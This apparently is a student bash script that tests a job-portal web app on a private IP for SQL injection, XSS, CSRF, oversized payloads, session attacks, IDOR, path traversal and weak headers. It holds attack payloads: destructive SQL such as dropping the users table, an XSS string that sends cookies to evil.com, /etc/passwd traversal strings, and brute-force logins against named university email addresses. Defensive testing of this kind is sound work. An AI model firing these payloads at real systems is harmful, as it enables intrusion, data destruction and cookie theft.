#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════
# Secure Job Portal — Penetration Test Script
# Simulates a sophisticated external attacker testing for:
#   1. SQL Injection (auth bypass, UNION, blind, stacked queries)
#   2. XSS (stored, reflected, DOM-based)
#   3. CSRF (missing token, forged token, cross-origin)
#   4. Buffer Overflow / DoS (oversized payloads)
#   5. Session Hijacking (cookie theft, token replay, fixation)
#   6. Authentication Attacks (brute-force, enumeration, lockout bypass)
#   7. Authorization Attacks (privilege escalation, IDOR)
#   8. Header Injection / Security misconfiguration
#   9. Path Traversal / File inclusion
#  10. Rate Limiting evasion
#
# Usage:
#   chmod +x security_test.sh
#   ./security_test.sh [https://192.168.2.233]
#
# ═══════════════════════════════════════════════════════════════════════════

set -uo pipefail

# ── Configuration ─────────────────────────────────────────────────────────
BASE_URL="${1:-https://192.168.2.233}"
API_URL="${BASE_URL}/api"
CURL_OPTS="-sk --max-time 10"  # -s silent, -k insecure (self-signed), timeout 10s

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0
WARN=0
TOTAL=0

# ── Helpers ───────────────────────────────────────────────────────────────

test_header() {
    echo ""
    echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}  $1${NC}"
    echo -e "${CYAN}${BOLD}══════════════════════════════════════════════════════════════${NC}"
}

check_result() {
    local test_name="$1"
    local condition="$2"  # "pass" or "fail"
    local detail="$3"
    ((TOTAL++))

    if [[ "$condition" == "pass" ]]; then
        ((PASS++))
        echo -e "  ${GREEN}[PASS]${NC} ${test_name}"
        [[ -n "$detail" ]] && echo -e "         ${GREEN}↳ ${detail}${NC}"
    elif [[ "$condition" == "warn" ]]; then
        ((WARN++))
        echo -e "  ${YELLOW}[WARN]${NC} ${test_name}"
        [[ -n "$detail" ]] && echo -e "         ${YELLOW}↳ ${detail}${NC}"
    else
        ((FAIL++))
        echo -e "  ${RED}[FAIL]${NC} ${test_name}"
        [[ -n "$detail" ]] && echo -e "         ${RED}↳ ${detail}${NC}"
    fi
}

# Get CSRF token from the server
get_csrf_token() {
    local response
    response=$(curl $CURL_OPTS -c /tmp/sjp_cookies.txt "${API_URL}/auth/csrf" 2>/dev/null)
    echo "$response" | grep -o '"csrf_token":"[^"]*"' | cut -d'"' -f4
}

# ═══════════════════════════════════════════════════════════════════════════
#  BANNER
# ═══════════════════════════════════════════════════════════════════════════

echo -e "${RED}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════════════╗"
echo "  ║     🔓 SECURE JOB PORTAL — PENETRATION TEST SUITE 🔓       ║"
echo "  ║     Simulating: SQL Injection, XSS, CSRF, Buffer           ║"
echo "  ║     Overflow, Session Hijacking & More                      ║"
echo "  ╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "  Target: ${BOLD}${BASE_URL}${NC}"
echo -e "  Time:   $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# ═══════════════════════════════════════════════════════════════════════════
#  TEST 1: SQL INJECTION
# ═══════════════════════════════════════════════════════════════════════════

test_header "1. SQL INJECTION ATTACKS"

# 1.1 — Classic auth bypass via login
echo -e "\n  ${BOLD}1.1 Authentication Bypass Attempts${NC}"

SQL_PAYLOADS=(
    "' OR '1'='1"
    "' OR '1'='1' --"
    "' OR '1'='1' /*"
    "admin'--"
    "' UNION SELECT null,null,null --"
    "1; DROP TABLE users; --"
    "' OR 1=1; --"
    "') OR ('1'='1"
    "' OR ''='"
    "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
)

for payload in "${SQL_PAYLOADS[@]}"; do
    response=$(curl $CURL_OPTS -X POST "${API_URL}/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"${payload}\",\"password\":\"${payload}\"}" 2>/dev/null)
    
    http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "${API_URL}/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"${payload}\",\"password\":\"${payload}\"}" 2>/dev/null)
    
    # Check: should NOT return 200, should NOT contain "access_token" or "healthy"
    if echo "$response" | grep -qi "error\|invalid\|unauthorized\|failed\|locked\|too many\|validation\|422"; then
        check_result "Login SQLi: ${payload:0:40}..." "pass" "Rejected (HTTP ${http_code})"
    elif [[ "$http_code" == "200" ]]; then
        check_result "Login SQLi: ${payload:0:40}..." "fail" "⚠ POSSIBLE SQL INJECTION — got HTTP 200!"
    else
        check_result "Login SQLi: ${payload:0:40}..." "pass" "Rejected (HTTP ${http_code})"
    fi
done

# 1.2 — SQLi in search/query parameters
echo -e "\n  ${BOLD}1.2 SQL Injection in Search Endpoints${NC}"

SEARCH_PAYLOADS=(
    "'; DROP TABLE users;--"
    "' UNION SELECT username,password FROM users--"
    "1 OR 1=1"
    "' AND (SELECT COUNT(*) FROM users) > 0 --"
    "admin' AND SUBSTRING(password,1,1)='a'--"
)

for payload in "${SEARCH_PAYLOADS[@]}"; do
    encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null)
    http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
        "${API_URL}/users/search?q=${encoded_payload}" 2>/dev/null)
    
    if [[ "$http_code" =~ ^(401|403|422|400|500)$ ]]; then
        check_result "Search SQLi: ${payload:0:45}..." "pass" "Blocked (HTTP ${http_code})"
    else
        # Even 200 is OK if parameterized queries are used (returns empty results)
        response=$(curl $CURL_OPTS "${API_URL}/users/search?q=${encoded_payload}" 2>/dev/null)
        if echo "$response" | grep -qi "password\|hashed_password\|secret"; then
            check_result "Search SQLi: ${payload:0:45}..." "fail" "⚠ DATA LEAKED!"
        else
            check_result "Search SQLi: ${payload:0:45}..." "pass" "No data leak (HTTP ${http_code})"
        fi
    fi
done

# 1.3 — SQLi in URL path parameters
echo -e "\n  ${BOLD}1.3 SQL Injection in Path Parameters${NC}"

PATH_PAYLOADS=(
    "1%20OR%201=1"
    "1;%20DROP%20TABLE%20users"
    "1'%20UNION%20SELECT%20*%20FROM%20users--"
)

for payload in "${PATH_PAYLOADS[@]}"; do
    http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
        "${API_URL}/users/${payload}" 2>/dev/null)
    
    if [[ "$http_code" =~ ^(400|404|422|500)$ ]]; then
        check_result "Path SQLi: ${payload:0:45}..." "pass" "Rejected (HTTP ${http_code})"
    else
        check_result "Path SQLi: ${payload:0:45}..." "warn" "Returned HTTP ${http_code}, manual review needed"
    fi
done


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 2: CROSS-SITE SCRIPTING (XSS)
# ═══════════════════════════════════════════════════════════════════════════

test_header "2. CROSS-SITE SCRIPTING (XSS)"

echo -e "\n  ${BOLD}2.1 Stored XSS via Registration${NC}"

XSS_PAYLOADS=(
    '<script>alert("XSS")</script>'
    '<img src=x onerror=alert(1)>'
    '"><svg/onload=alert(1)>'
    "javascript:alert(document.cookie)"
    '<iframe src="javascript:alert(1)">'
    '"><img src=x onerror=fetch("https://evil.com/steal?c="+document.cookie)>'
    "';alert(String.fromCharCode(88,83,83))//'"
    '<body onload=alert(1)>'
    '<div style="background:url(javascript:alert(1))">'
    '{{constructor.constructor("return this")().alert(1)}}'
)

for payload in "${XSS_PAYLOADS[@]}"; do
    response=$(curl $CURL_OPTS -X POST "${API_URL}/auth/register" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"xss_test_$(date +%s%N)@test.com\",\"password\":\"StrongPass@123!\",\"full_name\":\"${payload}\"}" 2>/dev/null)
    
    # Check if the payload was sanitized (stripped of script tags, etc.)
    if echo "$response" | grep -q "<script>\|onerror=\|onload=\|javascript:"; then
        check_result "Stored XSS: ${payload:0:45}..." "fail" "⚠ XSS payload reflected unsanitized!"
    else
        check_result "Stored XSS: ${payload:0:45}..." "pass" "Payload sanitized or rejected"
    fi
done

echo -e "\n  ${BOLD}2.2 Reflected XSS via Search${NC}"

for payload in "${XSS_PAYLOADS[@]}"; do
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${payload}'''))" 2>/dev/null)
    response=$(curl $CURL_OPTS "${API_URL}/users/search?q=${encoded}" 2>/dev/null)
    
    if echo "$response" | grep -q "<script>\|onerror=\|onload="; then
        check_result "Reflected XSS: ${payload:0:40}..." "fail" "⚠ Payload reflected in response!"
    else
        check_result "Reflected XSS: ${payload:0:40}..." "pass" "Not reflected"
    fi
done

echo -e "\n  ${BOLD}2.3 XSS Security Headers Check${NC}"

response_headers=$(curl $CURL_OPTS -I "${BASE_URL}/" 2>/dev/null)

if echo "$response_headers" | grep -qi "X-XSS-Protection"; then
    check_result "X-XSS-Protection header present" "pass" "$(echo "$response_headers" | grep -i 'X-XSS-Protection')"
else
    check_result "X-XSS-Protection header present" "fail" "Missing — browsers won't filter XSS"
fi

if echo "$response_headers" | grep -qi "Content-Security-Policy"; then
    check_result "Content-Security-Policy header present" "pass" "CSP is set"
else
    check_result "Content-Security-Policy header present" "fail" "Missing — no CSP protection!"
fi

if echo "$response_headers" | grep -qi "X-Content-Type-Options"; then
    check_result "X-Content-Type-Options header present" "pass" "nosniff prevents MIME confusion"
else
    check_result "X-Content-Type-Options header present" "fail" "Missing nosniff header"
fi


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 3: CSRF (Cross-Site Request Forgery)
# ═══════════════════════════════════════════════════════════════════════════

test_header "3. CSRF PROTECTION"

echo -e "\n  ${BOLD}3.1 State-Changing Requests Without CSRF Token${NC}"

# First register a test user to get valid cookies
curl $CURL_OPTS -c /tmp/sjp_cookies.txt -X POST "${API_URL}/auth/register" \
    -H "Content-Type: application/json" \
    -d '{"email":"csrf_test_user@test.com","password":"CsrfTest@123!","full_name":"CSRF Tester"}' > /dev/null 2>&1

# Attempt PUT without CSRF token (simulates cross-origin attack)
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
    -b /tmp/sjp_cookies.txt \
    -X PUT "${API_URL}/users/me" \
    -H "Content-Type: application/json" \
    -d '{"full_name":"HACKED BY CSRF"}' 2>/dev/null)

if [[ "$http_code" == "403" ]]; then
    check_result "PUT /users/me without CSRF token" "pass" "Blocked with 403 Forbidden"
else
    check_result "PUT /users/me without CSRF token" "fail" "⚠ Request succeeded without CSRF token (HTTP ${http_code})"
fi

# Attempt DELETE without CSRF
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
    -b /tmp/sjp_cookies.txt \
    -X DELETE "${API_URL}/auth/sessions/fake-session-id" 2>/dev/null)

if [[ "$http_code" == "403" ]]; then
    check_result "DELETE without CSRF token" "pass" "Blocked with 403"
else
    check_result "DELETE without CSRF token" "fail" "⚠ DELETE worked without CSRF (HTTP ${http_code})"
fi

echo -e "\n  ${BOLD}3.2 Forged / Invalid CSRF Token${NC}"

http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
    -b /tmp/sjp_cookies.txt \
    -X PUT "${API_URL}/users/me" \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: FAKE_FORGED_TOKEN_BY_ATTACKER_12345" \
    -d '{"full_name":"HACKED BY FORGED CSRF"}' 2>/dev/null)

if [[ "$http_code" == "403" ]]; then
    check_result "PUT with forged CSRF token" "pass" "Blocked — token mismatch detected"
else
    check_result "PUT with forged CSRF token" "fail" "⚠ Forged CSRF accepted! (HTTP ${http_code})"
fi

echo -e "\n  ${BOLD}3.3 CSRF Cookie Flags${NC}"

csrf_response=$(curl $CURL_OPTS -v "${API_URL}/auth/csrf" 2>&1)

if echo "$csrf_response" | grep -qi "SameSite=Lax\|SameSite=Strict"; then
    check_result "CSRF cookie has SameSite attribute" "pass" "Cross-site requests won't send cookie"
else
    check_result "CSRF cookie has SameSite attribute" "warn" "SameSite not detected (may default to Lax)"
fi


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 4: BUFFER OVERFLOW / PAYLOAD SIZE ATTACKS
# ═══════════════════════════════════════════════════════════════════════════

test_header "4. BUFFER OVERFLOW & OVERSIZED PAYLOADS"

echo -e "\n  ${BOLD}4.1 Oversized Input Fields${NC}"

# 4.1.1 — Extremely long email (10KB)
long_email=$(python3 -c "print('A' * 10000 + '@test.com')" 2>/dev/null)
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "${API_URL}/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${long_email}\",\"password\":\"test\"}" 2>/dev/null)
check_result "10KB email in login" "pass" "Handled gracefully (HTTP ${http_code})"

# 4.1.2 — Extremely long password (100KB)
long_pass=$(python3 -c "print('B' * 100000)" 2>/dev/null)
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "${API_URL}/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test@test.com\",\"password\":\"${long_pass}\"}" 2>/dev/null)
check_result "100KB password in login" "pass" "Handled gracefully (HTTP ${http_code})"

# 4.1.3 — Extremely long name (1MB)
echo -e "\n  ${BOLD}4.2 Oversized Registration Payload${NC}"
long_name=$(python3 -c "print('X' * 1000000)" 2>/dev/null)
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "${API_URL}/auth/register" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"overflow@test.com\",\"password\":\"Test@123!\",\"full_name\":\"${long_name}\"}" 2>/dev/null)

if [[ "$http_code" =~ ^(413|422|400|500)$ ]]; then
    check_result "1MB name in registration" "pass" "Rejected (HTTP ${http_code})"
else
    check_result "1MB name in registration" "warn" "Accepted (HTTP ${http_code}) — check if truncated"
fi

# 4.1.4 — Massive JSON body (5MB)
echo -e "\n  ${BOLD}4.3 Massive Request Body (5MB JSON)${NC}"
python3 -c "import json; print(json.dumps({'email':'big@test.com','password':'test','full_name':'A'*5000000}))" > /tmp/sjp_big_payload.json 2>/dev/null
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "${API_URL}/auth/register" \
    -H "Content-Type: application/json" \
    -d @/tmp/sjp_big_payload.json 2>/dev/null)

if [[ "$http_code" =~ ^(413|422|400|500)$ ]]; then
    check_result "5MB JSON body" "pass" "Rejected (HTTP ${http_code})"
elif [[ "$http_code" == "000" ]]; then
    check_result "5MB JSON body" "pass" "Connection rejected/timeout — good"
else
    check_result "5MB JSON body" "warn" "Accepted (HTTP ${http_code}) — verify server didn't crash"
fi

# 4.1.5 — Deeply nested JSON
echo -e "\n  ${BOLD}4.4 Deeply Nested JSON (Billion Laughs style)${NC}"
nested_json=$(python3 -c "
s = '{\"a\":'*500 + '\"deep\"' + '}'*500
print(s)
" 2>/dev/null)
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "${API_URL}/auth/login" \
    -H "Content-Type: application/json" \
    -d "${nested_json}" 2>/dev/null)

if [[ "$http_code" =~ ^(400|413|422|500)$ ]]; then
    check_result "Deeply nested JSON (500 levels)" "pass" "Rejected (HTTP ${http_code})"
else
    check_result "Deeply nested JSON (500 levels)" "warn" "HTTP ${http_code} — verify no crash"
fi


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 5: SESSION HIJACKING
# ═══════════════════════════════════════════════════════════════════════════

test_header "5. SESSION HIJACKING"

echo -e "\n  ${BOLD}5.1 Cookie Security Flags${NC}"

# Login to get cookies
login_headers=$(curl $CURL_OPTS -v -X POST "${API_URL}/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"csrf_test_user@test.com","password":"CsrfTest@123!"}' 2>&1)

# Check HttpOnly flag on access_token
if echo "$login_headers" | grep -i "access_token" | grep -qi "HttpOnly"; then
    check_result "access_token has HttpOnly flag" "pass" "JS cannot steal this cookie"
else
    if echo "$login_headers" | grep -qi "access_token"; then
        check_result "access_token has HttpOnly flag" "warn" "Cookie set but HttpOnly not confirmed — verify manually"
    else
        check_result "access_token has HttpOnly flag" "warn" "No access_token cookie found in response"
    fi
fi

# Check Secure flag
if echo "$login_headers" | grep -i "access_token" | grep -qi "Secure"; then
    check_result "access_token has Secure flag" "pass" "Cookie only sent over HTTPS"
else
    check_result "access_token has Secure flag" "warn" "Secure flag not confirmed — verify in production"
fi

# Check SameSite
if echo "$login_headers" | grep -i "access_token" | grep -qi "SameSite"; then
    check_result "access_token has SameSite flag" "pass" "Cross-site cookie sending prevented"
else
    check_result "access_token has SameSite flag" "warn" "SameSite not confirmed (defaults to Lax in modern browsers)"
fi

echo -e "\n  ${BOLD}5.2 Forged/Stolen JWT Token${NC}"

# Try accessing protected endpoints with a fake JWT
fake_jwt="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6IkFETUlOIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
    -H "Cookie: access_token=${fake_jwt}" \
    "${API_URL}/users/me" 2>/dev/null)

if [[ "$http_code" == "401" ]]; then
    check_result "Forged JWT rejected" "pass" "401 — fake token correctly rejected"
else
    check_result "Forged JWT rejected" "fail" "⚠ Forged JWT accepted! (HTTP ${http_code})"
fi

echo -e "\n  ${BOLD}5.3 Token Replay with Modified Fingerprint${NC}"

# Try using a valid token format but from different IP/User-Agent
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
    -H "Cookie: access_token=${fake_jwt}" \
    -H "User-Agent: AttackerBot/1.0" \
    -H "X-Forwarded-For: 1.2.3.4" \
    "${API_URL}/users/me" 2>/dev/null)

if [[ "$http_code" == "401" ]]; then
    check_result "Spoofed fingerprint rejected" "pass" "Device fingerprinting working"
else
    check_result "Spoofed fingerprint rejected" "fail" "⚠ Spoofed fingerprint accepted (HTTP ${http_code})"
fi

echo -e "\n  ${BOLD}5.4 Session Fixation${NC}"

# Try setting our own session cookie before login
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
    -H "Cookie: access_token=attacker_fixed_session_id_12345" \
    "${API_URL}/users/me" 2>/dev/null)

if [[ "$http_code" == "401" ]]; then
    check_result "Session fixation attempt" "pass" "Fixed session rejected"
else
    check_result "Session fixation attempt" "fail" "⚠ Fixed session accepted! (HTTP ${http_code})"
fi


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 6: AUTHENTICATION ATTACKS
# ═══════════════════════════════════════════════════════════════════════════

test_header "6. AUTHENTICATION ATTACKS"

echo -e "\n  ${BOLD}6.1 Brute Force Login & Account Lockout${NC}"

lockout_triggered=false
for i in $(seq 1 7); do
    response=$(curl $CURL_OPTS -X POST "${API_URL}/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"aniket22073@iiitd.ac.in","password":"WrongPassword'${i}'!"}' 2>/dev/null)
    
    if echo "$response" | grep -qi "locked\|too many"; then
        lockout_triggered=true
        check_result "Account lockout after ${i} attempts" "pass" "Brute force protection active"
        break
    fi
done

if [[ "$lockout_triggered" == "false" ]]; then
    check_result "Account lockout mechanism" "warn" "No lockout detected after 7 attempts — may need more"
fi

echo -e "\n  ${BOLD}6.2 User Enumeration Prevention${NC}"

# Try login with non-existent email
response_fake=$(curl $CURL_OPTS -X POST "${API_URL}/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"definitely_not_a_user@nowhere.com","password":"SomePass@123!"}' 2>/dev/null)

# Try login with existing email, wrong password
response_real=$(curl $CURL_OPTS -X POST "${API_URL}/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"harsh22198@iiitd.ac.in","password":"WrongPassword@123!"}' 2>/dev/null)

fake_msg=$(echo "$response_fake" | grep -o '"detail":"[^"]*"' | head -1)
real_msg=$(echo "$response_real" | grep -o '"detail":"[^"]*"' | head -1)

if [[ "$fake_msg" == "$real_msg" ]]; then
    check_result "User enumeration prevention" "pass" "Same error for existing and non-existing users"
else
    check_result "User enumeration prevention" "fail" "⚠ Different errors: fake='${fake_msg}', real='${real_msg}'"
fi

echo -e "\n  ${BOLD}6.3 Rate Limiting on Login${NC}"

rate_limited=false
for i in $(seq 1 10); do
    http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "${API_URL}/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"ratelimit_test@test.com","password":"test"}' 2>/dev/null)
    
    if [[ "$http_code" == "429" ]]; then
        rate_limited=true
        check_result "Rate limiting triggered after ${i} requests" "pass" "429 Too Many Requests"
        break
    fi
done

if [[ "$rate_limited" == "false" ]]; then
    check_result "Rate limiting on /auth/login" "warn" "No 429 after 10 rapid requests — limit may be higher"
fi


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 7: AUTHORIZATION (PRIVILEGE ESCALATION / IDOR)
# ═══════════════════════════════════════════════════════════════════════════

test_header "7. AUTHORIZATION ATTACKS"

echo -e "\n  ${BOLD}7.1 Access Admin Panel Without Admin Role${NC}"

# Unauthenticated access to admin endpoints
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
    "${API_URL}/admin/users" 2>/dev/null)

if [[ "$http_code" =~ ^(401|403)$ ]]; then
    check_result "Admin panel (unauthenticated)" "pass" "Blocked (HTTP ${http_code})"
else
    check_result "Admin panel (unauthenticated)" "fail" "⚠ Admin panel accessible! (HTTP ${http_code})"
fi

echo -e "\n  ${BOLD}7.2 IDOR — Access Other Users' Data${NC}"

# Try to access another user's profile with a random UUID
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
    "${API_URL}/users/00000000-0000-0000-0000-000000000001" 2>/dev/null)

if [[ "$http_code" =~ ^(401|403|404)$ ]]; then
    check_result "IDOR on /users/{id}" "pass" "Protected (HTTP ${http_code})"
else
    response=$(curl $CURL_OPTS "${API_URL}/users/00000000-0000-0000-0000-000000000001" 2>/dev/null)
    if echo "$response" | grep -qi "hashed_password\|totp_secret\|file_encryption"; then
        check_result "IDOR on /users/{id}" "fail" "⚠ Sensitive data exposed!"
    else
        check_result "IDOR on /users/{id}" "pass" "Only public data returned (HTTP ${http_code})"
    fi
fi

echo -e "\n  ${BOLD}7.3 Direct Admin API Manipulation${NC}"

# Try role escalation without auth
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
    -X PUT "${API_URL}/admin/users/00000000-0000-0000-0000-000000000001/role" \
    -H "Content-Type: application/json" \
    -d '{"role":"ADMIN"}' 2>/dev/null)

if [[ "$http_code" =~ ^(401|403)$ ]]; then
    check_result "Role escalation attempt" "pass" "Blocked (HTTP ${http_code})"
else
    check_result "Role escalation attempt" "fail" "⚠ Role change possible without auth! (HTTP ${http_code})"
fi


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 8: SECURITY HEADERS & MISCONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

test_header "8. SECURITY HEADERS & MISCONFIGURATION"

echo -e "\n  ${BOLD}8.1 Response Headers Audit${NC}"

api_headers=$(curl $CURL_OPTS -I "${API_URL}/health" 2>/dev/null)

headers_to_check=(
    "X-Frame-Options"
    "X-Content-Type-Options"
    "Strict-Transport-Security"
    "Content-Security-Policy"
    "Referrer-Policy"
    "Permissions-Policy"
    "X-XSS-Protection"
)

for header in "${headers_to_check[@]}"; do
    if echo "$api_headers" | grep -qi "$header"; then
        value=$(echo "$api_headers" | grep -i "$header" | head -1 | tr -d '\r')
        check_result "${header}" "pass" "${value}"
    else
        check_result "${header}" "fail" "Missing!"
    fi
done

echo -e "\n  ${BOLD}8.2 Information Disclosure${NC}"

# Check if server version is exposed
if echo "$api_headers" | grep -qi "Server:.*uvicorn\|Server:.*python"; then
    check_result "Server version hidden" "warn" "Server header exposes technology"
else
    check_result "Server version hidden" "pass" "Server technology not disclosed"
fi

# Check if debug/docs endpoints are accessible
http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" "${API_URL}/docs" 2>/dev/null)
if [[ "$http_code" == "200" ]]; then
    check_result "Swagger docs disabled in prod" "warn" "API docs accessible — may reveal endpoints"
else
    check_result "Swagger docs disabled in prod" "pass" "API docs not accessible (HTTP ${http_code})"
fi

http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" "${API_URL}/redoc" 2>/dev/null)
if [[ "$http_code" == "200" ]]; then
    check_result "ReDoc disabled in prod" "warn" "ReDoc accessible"
else
    check_result "ReDoc disabled in prod" "pass" "ReDoc not accessible (HTTP ${http_code})"
fi


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 9: PATH TRAVERSAL & FILE INCLUSION
# ═══════════════════════════════════════════════════════════════════════════

test_header "9. PATH TRAVERSAL & FILE INCLUSION"

echo -e "\n  ${BOLD}9.1 Directory Traversal Attacks${NC}"

TRAVERSAL_PAYLOADS=(
    "../../../../etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..\\..\\..\\etc\\passwd"
)

for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
    response=$(curl $CURL_OPTS "${API_URL}/profile/${payload}/avatar" 2>/dev/null)
    
    if echo "$response" | grep -q "root:x:0:0\|bin/bash\|/bin/sh"; then
        check_result "Path traversal: ${payload:0:40}..." "fail" "⚠ FILE CONTENTS LEAKED!"
    else
        check_result "Path traversal: ${payload:0:40}..." "pass" "No file leak"
    fi
done


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 10: RATE LIMITING EVASION
# ═══════════════════════════════════════════════════════════════════════════

test_header "10. RATE LIMITING EVASION"

echo -e "\n  ${BOLD}10.1 X-Forwarded-For IP Spoofing${NC}"

# Try bypassing rate limit by spoofing different source IPs
spoofed_blocked=false
for i in $(seq 1 8); do
    http_code=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
        -H "X-Forwarded-For: 10.0.0.${i}" \
        -X POST "${API_URL}/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"spoof@test.com","password":"test"}' 2>/dev/null)
    
    if [[ "$http_code" == "429" ]]; then
        spoofed_blocked=true
        check_result "Rate limit not bypassed by IP spoofing" "pass" "Blocked at request ${i}"
        break
    fi
done

if [[ "$spoofed_blocked" == "false" ]]; then
    check_result "Rate limit with X-Forwarded-For spoofing" "warn" "8 requests with spoofed IPs — may not trust X-Forwarded-For or limit is higher"
fi


# ═══════════════════════════════════════════════════════════════════════════
#  TEST 11: HTTPS & TLS
# ═══════════════════════════════════════════════════════════════════════════

test_header "11. HTTPS & TLS CONFIGURATION"

echo -e "\n  ${BOLD}11.1 HTTPS Redirect${NC}"

http_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://192.168.2.233/" 2>/dev/null)
if [[ "$http_code" == "301" || "$http_code" == "302" || "$http_code" == "308" ]]; then
    check_result "HTTP → HTTPS redirect" "pass" "HTTP redirects to HTTPS (${http_code})"
else
    check_result "HTTP → HTTPS redirect" "warn" "HTTP returned ${http_code} — may not redirect"
fi

echo -e "\n  ${BOLD}11.2 HSTS Header${NC}"

if echo "$api_headers" | grep -qi "Strict-Transport-Security"; then
    check_result "HSTS enabled" "pass" "Browsers will enforce HTTPS"
else
    check_result "HSTS enabled" "fail" "No HSTS — browsers may allow HTTP downgrade"
fi


# ═══════════════════════════════════════════════════════════════════════════
#  FINAL REPORT
# ═══════════════════════════════════════════════════════════════════════════

echo ""
echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}${CYAN}  PENETRATION TEST REPORT${NC}"
echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "  Target:    ${BOLD}${BASE_URL}${NC}"
echo -e "  Completed: ${BOLD}$(date '+%Y-%m-%d %H:%M:%S')${NC}"
echo ""
echo -e "  ┌──────────────────────────────────┐"
echo -e "  │  ${GREEN}PASSED:  ${PASS}${NC} tests              │"
echo -e "  │  ${YELLOW}WARNINGS: ${WARN}${NC} tests              │"
echo -e "  │  ${RED}FAILED:  ${FAIL}${NC} tests              │"
echo -e "  │  ${BOLD}TOTAL:   ${TOTAL}${NC} tests              │"
echo -e "  └──────────────────────────────────┘"
echo ""

if [[ $FAIL -eq 0 ]]; then
    echo -e "  ${GREEN}${BOLD}🛡️  EXCELLENT! No critical vulnerabilities found.${NC}"
    echo -e "  ${GREEN}  Your application is well-protected against common attacks.${NC}"
elif [[ $FAIL -le 2 ]]; then
    echo -e "  ${YELLOW}${BOLD}⚠️  GOOD — but ${FAIL} issue(s) need attention.${NC}"
else
    echo -e "  ${RED}${BOLD}🚨 CRITICAL — ${FAIL} vulnerabilities detected! Fix immediately.${NC}"
fi

echo ""
echo -e "  ${CYAN}Legend:${NC}"
echo -e "    ${GREEN}[PASS]${NC} = Attack was blocked/mitigated"
echo -e "    ${YELLOW}[WARN]${NC} = Needs manual review"
echo -e "    ${RED}[FAIL]${NC} = Vulnerability detected"
echo ""

# Cleanup
rm -f /tmp/sjp_cookies.txt /tmp/sjp_big_payload.json 2>/dev/null
